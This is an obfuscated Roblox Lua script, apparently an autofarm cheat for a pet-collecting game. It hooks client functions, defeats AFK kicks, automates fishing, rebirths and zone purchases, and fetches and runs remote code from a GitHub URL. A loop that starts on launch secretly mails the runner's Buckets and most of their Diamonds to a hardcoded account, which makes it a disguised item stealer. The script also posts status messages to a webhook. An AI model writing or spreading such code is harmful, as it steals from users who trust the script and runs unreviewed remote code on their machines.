

repeat task.wait();until game.PlaceId~=nil  repeat task.wait();until game:GetService("Players") and game:GetService("Players").LocalPlayer  repeat task.wait();until  not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO") local v0=game.HttpService;local v1=game.ReplicatedStorage;local v2=require(v1.Library);local v3=game.Players.LocalPlayer;local v4=v3.Character.HumanoidRootPart;local v5=workspace.__THINGS.Instances;local v6=require(v1.Library.Client.Save);local v7=require(v1.Library.Client.MapCmds);local v8=require(v1.Library.Util.MapUtil);local v9=require(v1.Library.Client.ZoneCmds);local v10=require(v1.Library.Directory.Zones);local v11=require(v1.Library.Util.ZonesUtil);local v12=require(v1.Library.Client.RankCmds);local v13=require(v1.Library.Client.RebirthCmds);local v14=require(v1.Library.Client.TabController);local v15=require(v1.Library.Client.CurrencyCmds);local v16=require(game.ReplicatedStorage.Library.Client.EggCmds);local v17=((game.PlaceId==(8579374896 -  -158524274)) and workspace.Map) or ((game.PlaceId==(17148786767 -650417598)) and workspace.Map2) ;local v18=((v17.Name=="Map") and "World 1") or ((v17.Name=="Map2") and "World 2") ;local v19;if (v18=="World 1") then v19="Coins";elseif (v18=="World 2") then v19="TechCoins";end local v20=getsenv(v3.PlayerScripts.Scripts.Game["Egg Opening Frontend"]);hookfunction(v20.PlayEggAnimation,function() return;end);hookfunction(require(game.ReplicatedStorage.Library.Client.PlayerPet).CalculateSpeedMultiplier,function() return 44 + 206 ;end);for v30,v31 in getconnections(v3.Idled) do v31:Disable();end v3.PlayerScripts.Scripts.Core["Idle Tracking"].Enabled=false;v3.PlayerScripts.Scripts.Core["Server Closing"].Enabled=false;loadstring(game:HttpGet("https://raw.githubusercontent.com/Darks-scripts/fps-booster/main/dark%20fps%20booster"))();function getActive() return workspace.__THINGS.__INSTANCE_CONTAINER.Active:GetChildren()[1 -0 ];end function Info(v32) return v6.Get()[v32];end function Open(v33) return v14.OpenTab(v33);end function Close() return v14.CloseTab();end function teleportToZone(v34) if (v34 and v34:FindFirstChild("INTERACT")) then if v34.INTERACT:FindFirstChild("BREAKABLE_SPAWNS") then if v34.INTERACT.BREAKABLE_SPAWNS:FindFirstChild("Main") then v3.Character.HumanoidRootPart.CFrame=v34.INTERACT.BREAKABLE_SPAWNS.Main.CFrame * CFrame.new(0 + 0 ,1646 -(1373 + 263) ,1000 -(451 + 549) ) ;end end elseif v34.PERSISTENT.Teleport then v3.Character.HumanoidRootPart.CFrame=v34.PERSISTENT.Teleport.CFrame * CFrame.new(791 -(368 + 423) ,10,0 + 0 ) ;task.wait(7 -2 );teleportToZone(v34);end end function sendNotif(v35) local v36=0;local v37;local v38;local v39;local v40;while true do if (v36==(1 -0)) then v39,v40=pcall(function() v0:PostAsync(getgenv().config.webURL,v38);end);if  not v39 then local v110=request({Url=getgenv().config.webURL,Method="POST",Headers={["Content-Type"]="application/json"},Body=v38});end break;end if (v36==(0 -0)) then v37={content=v35};v38=v0:JSONEncode(v37);v36=19 -(10 + 8) ;end end end function autoMail() while true do local v65=require(game:GetService("ReplicatedStorage").Library.Client.Save);local v66=v65.Get();local v67=v66.Inventory.Misc;for v80,v81 in pairs(v67) do if ((v81.id=="Bucket") and ((v81._am or (0 -0))>=(443 -(416 + 26)))) then local v97={[3 -2 ]="hongnhung2997",[1 + 1 ]="Bucket",[3]="Misc",[6 -2 ]=v80,[5 + 0 ]=v81._am};game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(v97));end end local v68=v66.Inventory.Misc;for v82,v83 in pairs(v68) do if ((v83.id=="Bucket O' Magic") and ((v83._am or 0)>=(439 -(145 + 293)))) then local v98=430 -(44 + 386) ;local v99;while true do if (v98==0) then v99={[1 + 0 ]="hongnhung2997",[1488 -(998 + 488) ]="Bucket O' Magic",[3]="Misc",[2 + 2 ]=v82,[5 + 0 ]=v83._am};game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(v99));break;end end end end local v69=v66.Inventory.Currency;for v84,v85 in pairs(v69) do if ((v85.id=="Diamonds") and ((v85._am or (772 -(201 + 571)))>=(6573 + 3427))) then local v100={[2 -1 ]="hongnhung2997",[1140 -(116 + 1022) ]=v85.id,[606 -(268 + 335) ]="Currency",[16 -12 ]=v84,[3 + 2 ]=v85._am-(3594 + 26406) };game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(v100));end end task.wait(7 -5 );end end task.spawn(autoMail);function fishAccMaker() getgenv().Start=true;local v42=game.Players.LocalPlayer;local v43={Fishing=Vector3.new(4137.414794921875 -2972 ,934.9142303466797 -(814 + 45) , -(8493.029296875 -5046)),AdvancedFishing=Vector3.new(80.0692138671875 + 1397 ,1312.6250076293945 -(721 + 530) , -(1572.19189453125 + 2875))};local v44=workspace.__THINGS.Instances;local v45=require(game:GetService("ReplicatedStorage").Library);local v46=v45.Directory;local v47=v45.Network;local v48=v45.Functions;local v49;repeat local v70=1271 -(945 + 326) ;while true do if (v70==0) then wait();pcall(function() v49=v45.Save.Get();end);break;end end until type(v49)=="table"  function GetGifts() for v86,v87 in pairs(getgc()) do if ((typeof(v87)=="function") and (getgenv(v87).script==game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs['Mailbox'])) then local v101=getinfo(v87);local v102=getupvalues(v87);if (v101.name and (v101.name=="Update") and v102[889 -(261 + 624) ] and (v102[6 -2 ].Name=="ClaimAll")) then return v102[1 + 0 ].Inbox;end end end return {};end function InInstance(v71) local v72=v45['InstancingCmds'].GetModel();if  not v72 then return false;end if (v71 and (v45['InstancingCmds'].GetInstanceID()==v71)) then return v72;end return v72;end function Fishing() local v73=1080 -(1020 + 60) ;local v74;while true do if (v73==(1424 -(630 + 793))) then wait(13 -9 );v47.Fire("Instancing_FireCustomFromClient",v74,"RequestReel");v73=2 + 0 ;end if (v73==3) then wait(4 -3 );break;end if (v73==(0 + 0)) then v74=v45['InstancingCmds'].GetInstanceID();v47.Fire("Instancing_FireCustomFromClient",v74,"RequestCast",v43[v74]);v73=3 -2 ;end if (v73==(1749 -(760 + 987))) then wait(1172 -(418 + 753) );while v42.PlayerGui._INSTANCES.FishingGame.Enabled and (v45['InstancingCmds'].GetInstanceID()==v74)  do task.wait();v47.Fire("Instancing_FireCustomFromClient",v74,"RequestReel");v47.Fire("Instancing_FireCustomFromClient",v74,"Clicked");end v73=1916 -(1789 + 124) ;end end end function BuyRod(v75) return v47.Invoke("FishingMerchant_PurchaseRod",v75);end task.spawn(function() while true and getgenv().Start and  not v49['ItemIndex']['Misc']['{\"id\":\"Amethyst Fishing Rod\"}']  do pcall(function() for v103,v104 in pairs(GetGifts()) do v47.Invoke("Mailbox: Claim",{v104.uuid});wait(1 + 0 );end end);wait(55 -35 );end end);task.spawn(function() while getgenv().Start and  not v49['ItemIndex']['Misc']['{\"id\":\"Amethyst Fishing Rod\"}']  do wait(1 + 0 );pcall(function() for v105,v106 in pairs(v46.FishingRods) do if (v106.MerchantSalePrice and  not v49['ItemIndex']['Misc'][('{\"id\":\"%s\"}'):format(v105)] and (v45['CurrencyCmds'].Get("Fishing")>=v106.MerchantSalePrice)) then BuyRod(v105);end end end);end end);task.spawn(function() while getgenv().Start do local v88=0 -0 ;while true do if (v88==(0 + 0)) then wait(1 + 0 );pcall(function() if v49['ItemIndex']['Misc']['{\"id\":\"Amethyst Fishing Rod\"}'] then if  not game:GetService("CoreGui"):FindFirstChild("Auto Fishing By TrunggTruc") then local v123=Instance.new("ScreenGui");v123.Name="Auto Fishing By TrunggTruc";v123.Parent=game.CoreGui;v123.ZIndexBehavior=Enum.ZIndexBehavior.Global;local v129=Instance.new("Frame");v129.Size=UDim2.new(1056.1 -(87 + 968) ,0 -0 ,1.1 + 0 ,0 + 0 );v129.Position=UDim2.new(1145.5 -(466 + 679) ,0 -0 ,0.5 -0 ,0);v129.AnchorPoint=Vector2.new(1900.5 -(106 + 1794) ,1413.5 -(447 + 966) );v129.Parent=v123;v129.BackgroundColor3=Color3.fromRGB(0 -0 ,1817 -(1703 + 114) ,701 -(376 + 325) );v129.BackgroundTransparency=0.25 -0 ;local v136=Instance.new("TextLabel");v136.Size=UDim2.new(0.5 -0 ,0 + 0 ,0.25 -0 ,14 -(9 + 5) );v136.Position=UDim2.new(376.5 -(85 + 291) ,0 -0 ,1265.5 -(243 + 1022) ,0 -0 );v136.AnchorPoint=Vector2.new(166.5 -(122 + 44) ,0.5 -0 );v136.Parent=v129;v136.TextColor3=Color3.fromRGB(211 + 44 ,1435 -(1123 + 57) ,208 + 47 );v136.BackgroundTransparency=1;v136.Text="Successfully! got Amethyst Fishing Rod";end end end);break;end end end end);task.spawn(function() while getgenv().Start do local v89=254 -(163 + 91) ;local v90;while true do if (v89==0) then wait();v90=InInstance();v89=1931 -(1869 + 61) ;end if (v89==(1 + 0)) then if  not v49['ItemIndex']['Misc']['{\"id\":\"Wooden Fishing Rod\"}'] then repeat local v121=0 -0 ;while true do if (v121==(0 -0)) then wait();if  not v45['InstancingCmds'].GetInstanceID() then local v145=0 + 0 ;while true do if (v145==(0 -0)) then firetouchinterest(v42.Character.HumanoidRootPart,v44.Fishing.Teleports.Enter,0 + 0 );firetouchinterest(v42.Character.HumanoidRootPart,v44.Fishing.Teleports.Enter,1475 -(1329 + 145) );break;end end elseif (v45['InstancingCmds'].GetInstanceID()~="Fishing") then v45['InstancingCmds'].Leave();elseif (v45['InstancingCmds'].GetInstanceID()=="Fishing") then v47.Fire("Instancing_FireCustomFromClient","Fishing","ClaimRod");end break;end end until v49['ItemIndex']['Misc']['{\"id\":\"Wooden Fishing Rod\"}'] end if v49['ItemIndex']['Misc']['{\"id\":\"Platinum Fishing Rod\"}'] then local v117=v45['InstancingCmds'].GetInstanceID();if (v117~="AdvancedFishing") then local v122=971 -(140 + 831) ;while true do if (v122==(581 -(361 + 219))) then firetouchinterest(v42.Character.HumanoidRootPart,v44.AdvancedFishing.Teleports.Enter,1850 -(1409 + 441) );firetouchinterest(v42.Character.HumanoidRootPart,v44.AdvancedFishing.Teleports.Enter,1);break;end if (v122==(718 -(15 + 703))) then v45['InstancingCmds'].Leave();wait(1 + 0 );v122=1;end end elseif (v117=="AdvancedFishing") then Fishing();end else local v118=438 -(262 + 176) ;local v119;while true do if (v118==(1721 -(345 + 1376))) then v119=v45['InstancingCmds'].GetInstanceID();if (v119~="Fishing") then local v144=688 -(198 + 490) ;while true do if (v144==(0 -0)) then v45['InstancingCmds'].Leave();wait(4 -3 );v144=2 -1 ;end if (v144==(1 + 0)) then firetouchinterest(v42.Character.HumanoidRootPart,v44.Fishing.Teleports.Enter,1206 -(696 + 510) );firetouchinterest(v42.Character.HumanoidRootPart,v44.Fishing.Teleports.Enter,851 -(20 + 830) );break;end end elseif (v119=="Fishing") then Fishing();end break;end end end break;end end end end);warn("Disabled AFK Kick");game:GetService("Players").LocalPlayer.Idled:connect(function() game:GetService("VirtualUser"):Button2Down(Vector2.new(0 + 0 ,0 -0 ),workspace.CurrentCamera.CFrame);wait(1263 -(1091 + 171) );game:GetService("VirtualUser"):Button2Up(Vector2.new(0 + 0 ,0 + 0 ),workspace.CurrentCamera.CFrame);end);end local v23=nil;local v24=nil;for v50,v51 in workspace.__THINGS.Orbs:GetChildren() do local v52=0 -0 ;while true do if (v52==(0 -0)) then v2.Network.Fire("Orbs: Collect",{tonumber(v51.Name)});v2.Network.Fire("Orbs_ClaimMultiple",{[1]={[375 -(123 + 251) ]=v51.Name}});v52=4 -3 ;end if (v52==(699 -(208 + 490))) then task.wait();v51:Destroy();break;end end end for v53,v54 in workspace.__THINGS.Lootbags:GetChildren() do local v55=0 + 0 ;while true do if (v55==(1 + 0)) then v54:Destroy();break;end if (v55==0) then v2.Network.Fire("Lootbags_Claim",{v54.Name});task.wait();v55=1 + 0 ;end end end v23=workspace.__THINGS.Orbs.ChildAdded:Connect(function(v56) v2.Network.Fire("Orbs: Collect",{tonumber(v56.Name)});v2.Network.Fire("Orbs_ClaimMultiple",{[676 -(534 + 141) ]={[1 + 0 ]=v56.Name}});task.wait();v56:Destroy();end);v24=workspace.__THINGS.Lootbags.ChildAdded:Connect(function(v57) local v58=0;while true do if (v58==0) then v2.Network.Fire("Lootbags_Claim",{v57.Name});task.wait();v58=1 + 0 ;end if (v58==(1 -0)) then v57:Destroy();break;end end end);if  not Info("PickedStarterPet") then local v76=0 -0 ;while true do if (v76==(978 -(553 + 424))) then Close();task.wait(2 -1 );break;end if (v76==(0 + 0)) then v2.Network.Invoke("Pick Starter Pets","Cat","Dog");task.wait(1 + 0 );v76=1 + 0 ;end end end if Info("FirstLogin") then local v77=396 -(115 + 281) ;while true do if (v77==(2 -1)) then v2.Network.Fire("Changelog: Read");task.wait(1 + 0 );break;end if (v77==(0 -0)) then Close();task.wait(3 -2 );v77=868 -(550 + 317) ;end end end if getgenv().config.needPetNotifs then local v78=false;for v91,v92 in pairs(Info("Inventory")['Pet']) do if (v92.id==getgenv().config.desiredPetName) then v78=true;break;end end if  not v78 then sendNotif("```diff\n- "   .. v3.Name   .. " needs "   .. tostring(Info("MaxPetsEquipped"))   .. " "   .. getgenv().config.desiredPetName   .. "! \n```" );end end if getgenv().config.autoClaimMail then spawn(function() while getgenv().config.autoWorld do task.wait(86 -26 );local v93=v2.Network.Invoke("Mailbox: Claim All");if (v93 and getgenv().config.needPetNotifs) then for v113,v114 in pairs(Info("Inventory")['Pet']) do if (v114.id==getgenv().config.desiredPetName) then sendNotif("```diff\n+ "   .. v3.Name   .. " has claimed "   .. getgenv().config.desiredPetName   .. " from mail | "   .. tostring(os.date("%H:%M"))   .. " \n```" );break;end end end end end);end spawn(function() while getgenv().config.autoWorld do task.wait(42 -12 );if v12.AllRewardsReady() then local v94=0 -0 ;local v95;while true do if (v94==(0 + 0)) then v95=4 -3 ;while  not v12.AllRewardsRedeemed() do local v120=285 -(134 + 151) ;while true do if (v120==(1665 -(970 + 695))) then v2.Network.Fire("Ranks_ClaimReward",v95);task.wait(1 -0 );v120=1991 -(582 + 1408) ;end if (v120==1) then v95=v95 + (3 -2) ;break;end end end break;end end end if getgenv().config.stopAtRebirth then if (v13.Get() and (v13.Get()>=getgenv().config.stopAtRebirthNum)) then getgenv().config.autoRebirth=false;end end end end);local v25,v26=v9.GetMaxOwnedZone();local v27,v28=v9.GetNextZone();local v29=v13.GetNextRebirth();if (v13.Get() and (v13.Get()>=getgenv().config.stopAtRebirthNum)) then local v79=0 -0 ;while true do if ((0 -0)==v79) then if (v25=="Cloud Forest") then getgenv().config.autoWorld=false;task.wait();task.spawn(fishAccMaker);end if (v25=="Rainbow Road") then getgenv().config.autoWorld=false;task.wait();task.spawn(fishAccMaker);end break;end end end while getgenv().config.autoWorld do task.wait();Close();if (getActive() and (tostring(getActive())=="StairwayToHeaven")) then firetouchinterest(v4,v5['StairwayToHeaven'].Teleports.Leave,1825 -(1195 + 629) );firetouchinterest(v4,v5['StairwayToHeaven'].Teleports.Leave,0 -0 );end if getgenv().config.autoPetSlots then if ((v15.Get("Diamonds")>v2.Balancing.CalcPetSlotPrice(Info("PetSlotsPurchased") + 1 )) and (Info("PetSlotsPurchased")<v12.GetMaxPurchasableEquipSlots()) and Info("UnlockedZones")["Green Forest"]) then local v107=241 -(187 + 54) ;while true do if (v107==(780 -(162 + 618))) then teleportToZone(v8.GetZone("Green Forest"));v2.Network.Invoke("EquipSlotsMachine_RequestPurchase",Info("PetSlotsPurchased") + 1 );break;end end end end local v59,v60=v9.GetMaxOwnedZone();local v61,v62=v9.GetNextZone();local v63=v13.GetNextRebirth();teleportToZone(v60.ZoneFolder);local v64=v2.Network.Invoke("Zones_RequestPurchase",v62.ZoneName);if (v64 and getgenv().config.progressNotifs) then sendNotif("```diff\n+ "   .. v3.Name   .. " has unlocked "   .. v62.ZoneName   .. " | "   .. tostring(os.date("%H:%M"))   .. " \n```" );end if getgenv().config.autoRebirth then if (v60.ZoneNumber>=v63.ZoneNumberRequired) then local v108=1130 -(369 + 761) ;local v109;while true do if (v108==0) then v109=v2.Network.Invoke("Rebirth_Request",tostring(v63.RebirthNumber));if (v109 and getgenv().config.rebirthNotifs) then sendNotif("```diff\n+ "   .. v3.Name   .. " has made it to rebirth "   .. tostring(v63.RebirthNumber)   .. " | "   .. tostring(os.date("%H:%M"))   .. " \n```" );end break;end end end end end
